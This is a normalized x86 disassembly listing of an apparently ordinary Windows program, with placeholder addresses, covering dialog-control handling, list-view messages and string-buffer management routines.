pop esi
sub_4607d0
push esi
mov esi ecx
cmp [ esi + 0x1c ] 0x10
jb r-xdata
xor eax eax
mov [ esi + 0x1c ] 0xf
mov [ esi + 0x18 ] eax
mov [ esi + 0x8 ] al
pop esi
retn
mov eax [ esi + 0x8 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
sub_460800
push ebx
mov ebx [ rw-data ]
push ebp
push esi
push edi
xor ebp ebp
xor edi edi
xor ecx ecx
lea esi [ ebx + 0x8 ]
mov edx [ rw-data ]
sub edx ebx
mov eax 0x2aaaaaab
imul edx
sar edx 0x1
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
pop edi
pop esi
mov eax ebp
pop ebp
pop ebx
retn
mov edx [ esi ]
shl edx cl
add esi 0xc
or ebp edx
inc edi
add ecx 0x2
jmp r-xdata
cmp edi edx
jge r-xdata
test ebx ebx
jne r-xdata
sub_460850
mov ecx [ rw-data ]
push ebx
mov ebx [ rw-data ]
push esi
mov esi [ esp + 0x10 ]
push edi
mov edi [ esp + 0x10 ]
xor edx edx
lea esp [ esp ]
mov eax ebx
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
pop edi
pop esi
xor eax eax
pop ebx
retn
movzx eax [ ecx + edx * 4 + 0x2 ]
cmp edi eax
jne r-xdata
cmp edx eax
jge r-xdata
inc edx
jmp r-xdata
mov eax [ ecx + edx * 4 ]
shr eax 0xc
and eax 0xf
cmp esi eax
je r-xdata
test ecx ecx
jne r-xdata
mov eax [ ecx + edx * 4 ]
pop edi
shl eax 0x14
pop esi
sar eax 0x14
pop ebx
retn
sub_4608b0
sub esp 0x15c
push ebx
push ebp
push esi
push edi
call sub_460800
mov esi eax
mov eax [ rw-data ]
test eax eax
mov [ esp + 0x18 ] esi
jne r-xdata
mov ecx [ rw-data ]
sub ecx eax
mov eax 0x2aaaaaab
imul ecx
sar edx 0x1
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov esi [ GetDlgItem@IAT ]
push 0x1
push 0x779
push edi
call esi
mov ebx [ EnableWindow@IAT ]
push eax
call ebx
push 0x0
push 0x77a
push edi
call esi
push eax
call ebx
mov edx [ rw-data ]
push 0x0
dec edx
push edx
push 0x14e
push 0x777
push edi
call [ SendDlgItemMessageA@IAT ]
push 0x779
push edi
call esi
push eax
call [ SetFocus@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x15c
retn
lea eax [ esp + 0x1c ]
push eax
push 0x0
push 0x1005
push esi
mov [ esp + 0x30 ] ebp
call ebx
test eax eax
je r-xdata
lea ecx [ esp + 0x6c ]
push ecx
push edx
push esi
call sub_45b070
mov edi [ esp + 0x17c ]
add esp 0xc
lea edx [ esp + 0x6c ]
push edx
push 0x776
push edi
call [ SetDlgItemTextA@IAT ]
push 0x778
push edi
call [ GetDlgItem@IAT ]
mov ebx [ SendMessageA@IAT ]
push 0x0
push 0x0
mov esi eax
push 0x1004
push esi
mov [ esp + 0x20 ] 0xffffffff
call ebx
xor ebp ebp
test eax eax
mov [ esp + 0x14 ] eax
mov [ esp + 0x1c ] 0xc
mov [ esp + 0x2c ] 0x2
jle r-xdata
mov eax [ esp + 0x14 ]
inc ebp
cmp ebp eax
jl r-xdata
mov eax [ esp + 0x28 ]
test eax eax
je r-xdata
cmp [ esp + 0x10 ] 0xffffffff
jne r-xdata
movzx edx [ esp + 0x3e ]
cmp edx [ esp + 0x18 ]
jne r-xdata
lea ecx [ esp + 0x44 ]
push ecx
push ebp
push 0x102b
push esi
mov [ esp + 0x64 ] 0x2
mov [ esp + 0x60 ] 0x0
call ebx
push 0x0
push 0x779
push edi
call [ GetDlgItem@IAT ]
mov ebp [ EnableWindow@IAT ]
push eax
call ebp
push 0x1
push 0x77a
push edi
call [ GetDlgItem@IAT ]
push eax
call ebp
push esi
call [ SetFocus@IAT ]
mov edi [ esp + 0x10 ]
mov eax 0x3
mov [ esp + 0x54 ] eax
mov [ esp + 0x50 ] eax
lea eax [ esp + 0x44 ]
push eax
push edi
push 0x102b
push esi
call ebx
push 0x0
push edi
push 0x1013
push esi
call ebx
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x15c
retn
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov ecx [ rw-data ]
sub ecx eax
mov eax 0x2aaaaaab
imul ecx
sar edx 0x1
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov [ esp + 0x10 ] ebp
mov ecx [ esp + 0x3c ]
shr ecx 0xc
and ecx 0xf
cmp ecx edx
jne r-xdata
sub_460ab0
push ecx
push esi
call sub_460800
mov ecx [ esp + 0x4 ]
shl eax 0x10
and ecx 0xffff
or eax ecx
mov esi eax
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov ecx [ rw-data ]
sub ecx eax
mov eax 0x2aaaaaab
imul ecx
sar edx 0x1
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
shl edx 0xc
xor edx esi
and edx 0xf000
xor esi edx
mov ecx esi
shr ecx 0xc
and ecx 0xf
mov edx esi
push ecx
shr edx 0x10
push edx
call sub_460850
xor eax esi
and eax 0xfff
add esp 0x8
xor esi eax
mov eax esi
pop esi
pop ecx
retn
sub_460b20
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov ecx [ rw-data ]
sub ecx eax
mov eax 0x2aaaaaab
imul ecx
sar edx 0x1
mov eax edx
shr eax 0x1f
add edx eax
push edx
call sub_460800
push eax
call sub_460850
add esp 0x8
retn
xor edx edx
push edx
call sub_460800
push eax
call sub_460850
add esp 0x8
retn
sub_460b70
push ebp
mov ebp esp
push 0xffffffff
push sub_4c09e8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x34
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
test edi edi
mov [ eax ] 0x0
mov [ ebp - 0x10 ] esp
mov [ ecx ] 0x0
jl r-xdata
or eax 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ebx [ rw-data ]
test ebx ebx
jne r-xdata
mov ecx [ rw-data ]
sub ecx ebx
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov esi edi
imul esi esi 0x70
cmp [ esi + ebx + 0x18 ] 0x10
jb r-xdata
cmp edi edx
jge r-xdata
lea eax [ esi + ebx + 0x4 ]
mov eax [ esi + ebx + 0x4 ]
jmp r-xdata
cmp [ eax + 0x38 ] 0xffffffff
jne r-xdata
push eax
call sub_439280
mov ebx eax
xor edx edx
add esp 0x4
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] edx
mov ecx [ rw-data ]
lea eax [ esi + ecx ]
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x14 ] edx
cmp [ eax + 0x30 ] edx
mov [ ebp - 0x4 ] edx
mov [ ebp + 0xb ] dl
je r-xdata
cmp [ rw-data ] edx
je r-xdata
mov ecx rw-data
call sub_4010f0
lea edx [ edi + 0x1 ]
cmp edx eax
jl r-xdata
mov ecx [ rw-data ]
cmp ecx edx
je r-xdata
push 0x1
lea ecx [ ebp - 0x18 ]
push ecx
lea edx [ ebp - 0x14 ]
push edx
push eax
call sub_4af910
mov edi eax
mov eax [ rw-data ]
lea ecx [ ebp - 0x18 ]
push ecx
lea edx [ ebp - 0x14 ]
add eax esi
push edx
push eax
call sub_4adff0
add esp 0x1c
test edi edi
jne r-xdata
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
push eax
push ecx
push edi
call sub_460b70
mov esi eax
mov eax [ ebp - 0x1c ]
add esp 0xc
test eax eax
mov [ ebp - 0x4 ] 0xffffffff
je r-xdata
dec edi
mov ecx [ eax + 0x40 ]
cmp ecx 0x1
je r-xdata
mov edx [ rw-data ]
sub edx ecx
sar edx 0x2
test edx edx
jbe r-xdata
cmp edi 0x1
je r-xdata
mov ebx [ Sleep@IAT ]
mov ecx [ ebp - 0xc ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ eax + 0x4 ]
mov ecx eax
add eax 0x4
dec edi
mov edx edi
test edx edx
mov [ eax ] edi
jne r-xdata
cmp ecx 0x2
je r-xdata
mov edx [ ecx + edi * 4 ]
test edx edx
je r-xdata
mov ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x24 ]
mov eax [ ebp - 0x1c ]
test eax eax
mov [ ebp - 0x4 ] 0xffffffff
je r-xdata
push 0x64
call ebx
mov eax [ rw-data ]
push 0x1
lea ecx [ ebp - 0x18 ]
push ecx
lea edx [ ebp - 0x14 ]
add eax esi
push edx
push eax
call sub_4af910
mov edi eax
mov eax [ rw-data ]
lea ecx [ ebp - 0x18 ]
push ecx
lea edx [ ebp - 0x14 ]
add eax esi
push edx
push eax
call sub_4adff0
add esp 0x1c
test edi edi
je r-xdata
mov ebx [ ebp - 0x20 ]
mov edx [ ecx ]
push 0x1
call [ edx ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ecx 0x4
je r-xdata
mov eax edx
push eax
mov [ ebp - 0x14 ] eax
call [ LocalSize@IAT ]
xor ecx ecx
jmp r-xdata
mov edx [ ebp - 0x18 ]
test edx edx
mov [ ebp - 0x4 ] 0x1
jne r-xdata
lea edx [ ebp - 0x40 ]
push edx
push ecx
mov ecx [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
push ecx
push 0x0
call sub_4b3e10
mov esi eax
add esp 0x18
test esi esi
jne r-xdata
mov esi [ eax + 0x4 ]
mov ecx eax
add eax 0x4
dec esi
mov edx esi
test edx edx
mov [ eax ] esi
jne r-xdata
test ecx ecx
jne r-xdata
cmp ebx 0x5
jne r-xdata
push 0x1
push ecx
push eax
mov eax [ ebp - 0x14 ]
push 0x0
push eax
push edx
call sub_41c070
add esp 0x18
push eax
lea ecx [ ebp - 0x1c ]
call sub_401020
mov esi [ ebp - 0x14 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x14 ]
test eax eax
je r-xdata
mov edx [ ebp - 0x38 ]
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x34 ]
mov [ eax ] edx
mov edx [ ebp + 0x10 ]
mov [ edx ] ecx
jmp r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
cmp ebx 0x5
push 0x0
push 0x0
jne r-xdata
cmp [ eax + 0x18 ] 0x10
jb r-xdata
mov [ ecx ] eax
call sub_43e8a0
add esp 0x10
mov esi eax
jmp r-xdata
inc [ eax + 0x4 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax [ ebp - 0x1c ]
test eax eax
push ecx
push edx
push ebx
push ecx
mov [ ebp + 0x10 ] esp
mov ecx esp
je r-xdata
mov eax [ ebp - 0x1c ]
test eax eax
mov [ ebp - 0x4 ] 0xffffffff
je r-xdata
mov cl [ ebp + 0xb ]
test cl cl
je r-xdata
lea ecx [ ebp - 0x1c ]
push ecx
push eax
call sub_402850
mov esi eax
add esp 0x10
test esi esi
jl r-xdata
push 0x0
lea edx [ ebp - 0x14 ]
push edx
push eax
call sub_4053a0
mov esi eax
add esp 0x14
test esi esi
jge r-xdata
add eax 0x4
mov [ ebp - 0x18 ] eax
xor eax eax
xor ecx ecx
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x18 ] ecx
xor eax eax
xor ecx ecx
jmp r-xdata
mov edi [ eax + 0x4 ]
mov ecx eax
add eax 0x4
dec edi
mov [ eax ] edi
mov edx edi
test edx edx
jne r-xdata
push eax
call [ LocalFree@IAT ]
mov ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x24 ]
mov [ ebp + 0xb ] 0x1
jmp r-xdata
mov eax [ ebp - 0x1c ]
test eax eax
mov [ ebp - 0x4 ] 0xffffffff
je r-xdata
mov edx [ ecx ]
push 0x1
call [ edx ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ eax + 0x4 ]
mov ecx eax
add eax 0x4
dec edi
mov edx edi
test edx edx
mov [ eax ] edi
jne r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_460f30
push esi
mov esi ecx
cmp [ esi + 0x74 ] 0x10
jb r-xdata
push ebx
xor ebx ebx
mov [ esi + 0x74 ] 0xf
mov [ esi + 0x70 ] ebx
mov [ esi + 0x60 ] bl
cmp [ esi + 0x20 ] 0x10
jb r-xdata
mov eax [ esi + 0x60 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov [ esi + 0x1c ] ebx
mov [ esi + 0x20 ] 0xf
mov [ esi + 0xc ] bl
mov esi [ esi ]
cmp esi ebx
pop ebx
je r-xdata
mov eax [ esi + 0xc ]
push eax
call j_sub_4b66ed#2
add esp 0x4
pop esi
retn
dec [ esi + 0xd48 ]
jne r-xdata
mov ecx esi
call sub_43fe30
push esi
call j_sub_4b66ed#2
add esp 0x4
sub_460fa0
mov eax ecx
xor ecx ecx
mov [ eax + 0x20 ] ecx
mov [ eax + 0x24 ] ecx
mov [ eax + 0x3c ] ecx
mov edx 0xf
mov [ eax + 0x40 ] edx
mov [ eax + 0x2c ] cl
mov [ eax + 0x94 ] edx
mov [ eax + 0x90 ] ecx
mov [ eax + 0x80 ] cl
mov [ eax + 0xb0 ] edx
mov [ eax + 0xac ] ecx
mov [ eax + 0x9c ] cl
mov [ eax + 0x104 ] edx
mov [ eax + 0x100 ] ecx
mov [ eax + 0xf0 ] cl
mov [ eax + 0x120 ] edx
mov [ eax + 0x11c ] ecx
mov [ eax + 0x10c ] cl
retn
sub_461010
push 0xffffffff
push sub_4c0a0b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ebx
push ebp
push esi
mov esi ecx
push edi
mov [ esp + 0x10 ] esi
mov eax [ esi + 0x120 ]
xor ebx ebx
mov ebp 0x10
cmp eax ebp
mov [ esp + 0x1c ] ebx
jb r-xdata
mov edi 0xf
mov [ esi + 0x120 ] edi
mov [ esi + 0x11c ] ebx
mov [ esi + 0x10c ] bl
cmp [ esi + 0x104 ] ebp
jb r-xdata
mov eax [ esi + 0x10c ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov [ esi + 0x104 ] edi
mov [ esi + 0x100 ] ebx
mov [ esi + 0xf0 ] bl
cmp [ esi + 0xb0 ] ebp
jb r-xdata
mov eax [ esi + 0xf0 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov [ esi + 0xb0 ] edi
mov [ esi + 0xac ] ebx
mov [ esi + 0x9c ] bl
cmp [ esi + 0x94 ] ebp
jb r-xdata
mov eax [ esi + 0x9c ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov [ esi + 0x94 ] edi
mov [ esi + 0x90 ] ebx
mov [ esi + 0x80 ] bl
cmp [ esi + 0x40 ] ebp
jb r-xdata
mov eax [ esi + 0x80 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov [ esi + 0x40 ] edi
mov [ esi + 0x3c ] ebx
mov [ esi + 0x2c ] bl
mov edi [ esi + 0x24 ]
cmp edi ebx
je r-xdata
mov eax [ esi + 0x2c ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov esi [ esi + 0x20 ]
cmp esi ebx
mov [ esp + 0x1c ] 0xffffffff
je r-xdata
dec [ edi + 0xd48 ]
jne r-xdata
mov ecx [ esp + 0x14 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
dec [ esi + 0xd48 ]
jne r-xdata
mov ecx edi
call sub_43fe30
push edi
call j_sub_4b66ed#2
add esp 0x4
mov ecx esi
call sub_43fe30
push esi
call j_sub_4b66ed#2
add esp 0x4
sub_461160
push ebx
mov ebx [ esp + 0x14 ]
push ebp
push esi
mov ebp ecx
mov eax [ ebp + 0x14 ]
push edi
mov edi [ esp + 0x14 ]
cmp eax edi
jb r-xdata
mov ecx ebp
call sub_4b5762
mov eax [ esp + 0x1c ]
cmp [ eax + 0x14 ] ebx
jae r-xdata
mov ecx [ ebp + 0x14 ]
mov esi [ esp + 0x18 ]
mov eax ecx
sub eax edi
cmp eax esi
jae r-xdata
mov edx [ esp + 0x1c ]
mov eax [ edx + 0x14 ]
mov edx [ esp + 0x24 ]
sub eax ebx
cmp eax edx
jae r-xdata
mov esi eax
or eax 0xffffffff
sub ecx esi
sub eax edx
cmp eax ecx
ja r-xdata
mov edx eax
mov [ esp + 0x24 ] edx
mov eax [ ebp + 0x14 ]
mov edx [ esp + 0x24 ]
mov ebx eax
mov ecx eax
sub ebx esi
sub ecx edi
add ebx edx
sub ecx esi
cmp eax ebx
mov [ esp + 0x14 ] ecx
mov [ esp + 0x18 ] ebx
jae r-xdata
mov ecx ebp
call sub_4b57a2
cmp ebp [ esp + 0x1c ]
lea ebx [ ebp + 0x4 ]
je r-xdata
cmp ebx 0xfffffffe
jbe r-xdata
cmp [ esp + 0x24 ] esi
ja r-xdata
mov eax [ ebp + 0x18 ]
cmp eax 0x10
jb r-xdata
mov eax [ ebp + 0x18 ]
cmp eax ebx
jae r-xdata
mov ecx ebp
call sub_4b57a2
mov eax [ esp + 0x20 ]
cmp eax edi
ja r-xdata
mov eax [ ebp + 0x18 ]
cmp eax 0x10
jb r-xdata
mov ecx ebx
mov ecx [ ebx ]
jmp r-xdata
test ebx ebx
jne r-xdata
mov ecx [ ebp + 0x14 ]
push ecx
push ebx
mov ecx ebp
call sub_401240
jmp r-xdata
lea ecx [ edi + esi ]
cmp ecx eax
mov eax [ ebp + 0x18 ]
ja r-xdata
mov eax [ ebp + 0x18 ]
cmp eax 0x10
jb r-xdata
mov ecx ebx
mov ecx [ ebx ]
jmp r-xdata
mov eax ebx
mov eax [ ebx ]
jmp r-xdata
cmp eax 0x10
jb r-xdata
cmp eax 0x10
mov [ ebp + 0x14 ] ebx
jb r-xdata
cmp eax 0x10
jb r-xdata
cmp eax 0x10
jb r-xdata
mov ecx ebx
mov ecx [ ebx ]
jmp r-xdata
mov eax ebx
mov eax [ ebx ]
jmp r-xdata
cmp eax 0x10
jb r-xdata
mov edx [ esp + 0x1c ]
add edx 0x4
mov ecx eax
mov edx [ ecx + 0x4 ]
jmp r-xdata
mov edx [ esp + 0x14 ]
add ecx edi
push edx
add ecx esi
push ecx
mov ecx [ esp + 0x2c ]
add eax edi
add eax ecx
push eax
call sub_4b5890
mov eax [ esp + 0x28 ]
mov ecx [ eax + 0x18 ]
add esp 0xc
cmp ecx 0x10
jb r-xdata
lea eax [ ebp + 0x4 ]
mov eax [ ebp + 0x4 ]
jmp r-xdata
mov ecx ebx
mov ecx [ ebx ]
jmp r-xdata
mov ecx ebx
mov ecx [ ebx ]
jmp r-xdata
mov eax ebx
mov eax [ ebx ]
jmp r-xdata
cmp eax 0x10
jb r-xdata
mov ecx ebx
mov ecx [ ebx ]
jmp r-xdata
mov edx [ esp + 0x24 ]
push edx
mov edx [ esp + 0x24 ]
add ecx edx
push ecx
add eax edi
push eax
call sub_4b5890
mov eax [ ebp + 0x18 ]
add esp 0xc
cmp eax 0x10
jb r-xdata
mov eax ebx
mov eax [ ebx ]
jmp r-xdata
cmp [ ebp + 0x18 ] 0x10
jb r-xdata
mov [ eax ] 0x0
mov eax ebx
mov eax [ ebx ]
jmp r-xdata
cmp eax 0x10
jb r-xdata
mov eax ebx
mov eax [ ebx ]
jmp r-xdata
cmp eax 0x10
jb r-xdata
mov ecx ebx
mov ecx [ ebx ]
jmp r-xdata
mov edx [ esp + 0x14 ]
add ecx edi
push edx
add ecx esi
push ecx
mov ecx [ esp + 0x2c ]
add eax edi
add eax ecx
push eax
call sub_4b5890
mov eax [ ebp + 0x18 ]
add esp 0xc
cmp eax 0x10
jb r-xdata
mov eax ebx
mov eax [ ebx ]
jmp r-xdata
cmp eax 0x10
jb r-xdata
mov esi [ esp + 0x18 ]
cmp [ ebp + 0x14 ] esi
jb r-xdata
mov esi [ esp + 0x20 ]
mov ecx [ esp + 0x24 ]
add esi edx
mov edx ecx
shr ecx 0x2
add edi eax
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
mov ecx ebx
mov ecx [ ebx ]
jmp r-xdata
mov edx [ esp + 0x20 ]
push esi
add ecx edx
push ecx
add eax edi
push eax
call sub_4b5890
mov eax [ ebp + 0x18 ]
add esp 0xc
cmp eax 0x10
jb r-xdata
mov eax ebx
mov eax [ ebx ]
jmp r-xdata
mov edx [ esp + 0x14 ]
add ecx edi
push edx
add ecx esi
push ecx
mov ecx [ esp + 0x2c ]
add eax edi
add eax ecx
push eax
call sub_4b5890
mov ecx [ ebp + 0x18 ]
add esp 0xc
cmp ecx 0x10
jb r-xdata
mov edx [ esp + 0x24 ]
push edx
mov edx [ esp + 0x24 ]
mov eax ebx
add ecx edx
add eax edi
jmp r-xdata
mov edx [ esp + 0x24 ]
mov eax [ ebx ]
push edx
mov edx [ esp + 0x24 ]
add ecx edx
add eax edi
jmp r-xdata
cmp eax 0x10
jb r-xdata
push ecx
push eax
mov edx [ esp + 0x14 ]
add ecx edi
push edx
mov edx [ esp + 0x28 ]
add eax edi
add ecx esi
add eax edx
jmp r-xdata
cmp [ ebp + 0x18 ] 0x10
mov [ ebp + 0x14 ] esi
jb r-xdata
cmp esi 0xfffffffe
jbe r-xdata
mov eax ebx
mov eax [ ebx ]
jmp r-xdata
cmp eax 0x10
jb r-xdata
mov edx ebx
mov edx [ ebx ]
jmp r-xdata
cmp ecx 0x10
jb r-xdata
mov [ ebx + esi ] 0x0
mov ebx [ ebx ]
mov eax [ ebp + 0x18 ]
cmp eax esi
jae r-xdata
mov ecx ebp
call sub_4b57a2
mov ecx ebx
mov ecx [ ebx ]
jmp r-xdata
mov edx [ esp + 0x14 ]
push edx
mov edx [ esp + 0x28 ]
add ecx edi
add ecx esi
add eax edi
push ecx
add eax edx
push eax
call sub_4b5890
mov eax [ ebp + 0x18 ]
add esp 0xc
cmp eax 0x10
jb r-xdata
call sub_4b5890
add esp 0xc
mov ecx [ esp + 0x24 ]
sub eax esi
add eax [ esp + 0x20 ]
push ecx
add eax ecx
push eax
add edx edi
push edx
jmp r-xdata
test esi esi
jne r-xdata
mov ecx [ ebp + 0x14 ]
push ecx
push esi
mov ecx ebp
call sub_401240
test esi esi
mov [ esp + 0x1c ] ebx
mov eax [ ebx ]
mov [ esp + 0x1c ] eax
jmp r-xdata
cmp eax 0x10
jb r-xdata
jbe r-xdata
cmp eax 0x10
mov [ ebp + 0x14 ] esi
jb r-xdata
pop edi
pop esi
mov eax ebp
pop ebp
pop ebx
retn 0x14
mov eax [ esp + 0x24 ]
mov edx eax
sub edx esi
push edx
mov edx [ esp + 0x24 ]
add ecx edx
add ecx eax
mov eax [ esp + 0x20 ]
add eax edi
add eax esi
pop edi
pop esi
mov eax ebp
pop ebp
mov [ ebx ] 0x0
pop ebx
retn 0x14
mov ebx [ ebx ]
sub_4614e0
sub esp 0x8
mov eax [ ecx + 0x4 ]
push ebp
mov ebp [ eax + 0x4 ]
mov cl [ ebp + 0x2d ]
test cl cl
mov [ esp + 0x4 ] eax
jne r-xdata
pop ebp
add esp 0x8
retn 0x4
mov ecx [ esp + 0x10 ]
mov edx [ ecx + 0x18 ]
mov eax [ ecx + 0x14 ]
push ebx
push esi
add ecx 0x4
push edi
mov [ esp + 0x14 ] edx
mov [ esp + 0x1c ] ecx
jmp r-xdata
mov esi [ esp + 0x14 ]
mov edx 0x10
cmp esi edx
jb r-xdata
mov edi ecx
mov edi [ ecx ]
jmp r-xdata
cmp ebx eax
jb r-xdata
cmp ebx eax
mov ecx ebx
jb r-xdata
mov ebx [ ebp + 0x20 ]
test ebx ebx
je r-xdata
mov ebp [ ebp + 0x8 ]
jmp r-xdata
xor edx edx
cmp ebx eax
setne dl
test edx edx
cmp [ ebp + 0x24 ] edx
jb r-xdata
mov ecx eax
mov cl [ ebp + 0x2d ]
test cl cl
je r-xdata
mov [ esp + 0x10 ] ebp
mov ebp [ ebp ]
lea esi [ ebp + 0x10 ]
mov esi [ ebp + 0x10 ]
jmp r-xdata
mov ecx [ esp + 0x1c ]
jmp r-xdata
mov eax [ esp + 0x10 ]
pop edi
pop esi
pop ebx
test edx edx
jne r-xdata
sbb edx edx
sbb edx 0xffffffff
xor edx edx
[ esi ] [ edi ]
je r-xdata
jge r-xdata
sub_4615b0
mov ecx [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
cmp ecx edx
mov eax [ esp + 0xc ]
je r-xdata
retn
push esi
mov esi [ ecx ]
mov [ eax ] esi
add ecx 0x4
add eax 0x4
cmp ecx edx
jne r-xdata
pop esi
sub_4615e0
mov eax [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push eax
push ecx
mov ecx [ esp + 0x14 ]
push ecx
push ecx
mov eax esp
push ecx
mov ecx [ esp + 0x18 ]
mov [ eax ] edx
mov eax esp
mov [ eax ] ecx
call sub_45f5e0
add esp 0x14
retn 0xc
sub_461610
mov eax [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push eax
push ecx
mov ecx [ esp + 0x14 ]
push ecx
push ecx
mov eax esp
push ecx
mov ecx [ esp + 0x18 ]
mov [ eax ] edx
mov eax esp
mov [ eax ] ecx
call sub_45f620
add esp 0x14
retn 0xc
sub_461640
mov eax [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push eax
push ecx
mov ecx [ esp + 0x14 ]
push ecx
push ecx
mov eax esp
push ecx
mov ecx [ esp + 0x18 ]
mov [ eax ] edx
mov eax esp
mov [ eax ] ecx
call sub_45f660
add esp 0x14
retn 0xc
sub_461670
mov eax [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push eax
push ecx
mov ecx [ esp + 0x14 ]
push ecx
push ecx
mov eax esp
push ecx
mov ecx [ esp + 0x18 ]
mov [ eax ] edx
mov eax esp
mov [ eax ] ecx
call sub_45f6a0
add esp 0x14
retn 0xc
sub_4616a0
mov eax [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push eax
push ecx
mov ecx [ esp + 0x14 ]
push ecx
push ecx
mov eax esp
push ecx
mov ecx [ esp + 0x18 ]
mov [ eax ] edx
mov eax esp
mov [ eax ] ecx
call sub_45f6d0
add esp 0x14
retn 0xc
sub_4616d0
mov edx [ esp + 0x4 ]
mov eax [ esp + 0xc ]
push esi
mov esi [ esp + 0xc ]
cmp edx esi
je r-xdata
pop esi
retn
test eax eax
je r-xdata
add edx 0x4
add eax 0x4
cmp edx esi
jne r-xdata
mov ecx [ edx ]
test ecx ecx
je r-xdata
mov [ eax ] ecx
inc [ ecx + 0xd48 ]
sub_461700
push esi
mov esi ecx
mov eax [ esi + 0x18 ]
cmp eax 0x1
jae r-xdata
cmp eax 0x10
jb r-xdata
push 0x0
push 0x1
call sub_401240
jmp r-xdata
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] 0x0
mov [ esi + 0x4 ] 0x0
mov eax [ esi + 0x4 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
cmp [ esi + 0x18 ] 0x10
push edi
lea eax [ esi + 0x4 ]
jb r-xdata
mov edi eax
mov edi [ eax ]
jmp r-xdata
mov [ eax + 0x1 ] 0x0
mov eax esi
pop esi
retn 0x4
mov eax [ eax ]
movsx ecx [ esp + 0xc ]
mov [ edi ] cl
mov ch cl
cmp [ esi + 0x18 ] 0x10
mov [ esi + 0x14 ] 0x1
pop edi
jb r-xdata
sub_461770
push ebx
push esi
mov ebx ecx
mov esi [ ebx + 0x18 ]
cmp esi 0x10
push edi
jb r-xdata
lea eax [ ebx + 0x4 ]
mov eax [ ebx + 0x4 ]
jmp r-xdata
mov edi [ esp + 0x10 ]
cmp [ ebx + 0x14 ] edi
jae r-xdata
cmp esi 0x10
lea eax [ ebx + 0x4 ]
jb r-xdata
mov edx [ esp + 0x18 ]
cmp eax edx
ja r-xdata
mov eax [ ebx + 0x14 ]
mov esi [ esp + 0x14 ]
mov ecx eax
sub ecx edi
cmp ecx esi
jae r-xdata
mov ecx ebx
call sub_4b5762
mov ecx eax
mov ecx [ eax ]
jmp r-xdata
push ebp
mov ebp [ esp + 0x20 ]
or ecx 0xffffffff
sub eax esi
sub ecx ebp
cmp ecx eax
ja r-xdata
mov esi ecx
cmp esi 0x10
jb r-xdata
mov edi [ ebx + 0x14 ]
add edi ecx
cmp edx edi
jae r-xdata
mov edx [ ebx + 0x14 ]
sub edx edi
sub edx esi
cmp ebp esi
mov [ esp + 0x14 ] edx
jae r-xdata
mov ecx ebx
call sub_4b57a2
mov ecx [ esp + 0x1c ]
push ecx
sub edx eax
mov eax [ esp + 0x14 ]
push edx
mov edx [ esp + 0x1c ]
push ebx
push edx
push eax
mov ecx ebx
call sub_461160
pop edi
pop esi
pop ebx
retn 0x10
mov eax [ eax ]
test ebp ebp
ja r-xdata
cmp [ ebx + 0x18 ] 0x10
lea eax [ ebx + 0x4 ]
jb r-xdata
mov ecx [ ebx + 0x14 ]
sub ebp esi
add ebp ecx
cmp ebp 0xfffffffe
jbe r-xdata
test esi esi
jbe r-xdata
mov [ esp + 0x18 ] eax
mov ecx [ eax ]
mov [ esp + 0x18 ] ecx
jmp r-xdata
mov eax [ ebx + 0x18 ]
cmp eax ebp
jae r-xdata
mov ecx ebx
call sub_4b57a2
pop ebp
pop edi
pop esi
